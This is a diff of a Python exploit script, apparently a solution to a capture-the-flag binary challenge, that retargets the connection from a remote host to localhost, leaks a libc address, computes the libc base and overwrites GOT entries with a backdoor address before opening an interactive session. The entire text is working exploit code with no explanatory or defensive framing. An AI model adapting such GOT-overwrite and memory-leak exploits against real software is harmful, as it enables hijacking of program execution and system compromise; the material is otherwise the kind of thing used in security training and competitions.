@@ -53,7 +53,7 @@ if REMOTE_LOCAL=="y":
     debug_init()
     
 else:                                           
-    REMOTE_INFO=split_nc("nc naup.com 2000")
+    REMOTE_INFO=split_nc("nc 127.0.0.1 51000")
 
     REMOTE_IP=REMOTE_INFO[0]
     REMOTE_PORT=int(REMOTE_INFO[1])
@@ -90,15 +90,25 @@ def show():
 ### exploit
 
 login()
-got = 0x404058
-backdoor = 0x40142c
+got = 0x403fc8
+backdoor = 0x4013ec
 
-create(b"MyGO", b'MyGO' * 8)
+create(b"MyGO", b'MyGO')
 edit_title(b"MyGO" * 6 + p64(got))
-edit_content(p64(backdoor))
 
 show()
 
+rcu(b"MyGO @ Content : ")
+leaklibc = u64(rcl().strip().ljust(8, b"\x00"))
+# libcbase = leaklibc - 0x4bf0e0
+libcbase = leaklibc - 0x2e80e0
+ABS_GOT = libcbase + 0x21a098
+
+edit_title(b"MyGO" * 6 + p64(ABS_GOT))
+edit_content(p64(backdoor))
+
+NAUPINFO("LEAKLIBC", hex(leaklibc))
+NAUPINFO("LIBCBASE", hex(libcbase))
 ### interactive
 ita()
 ```
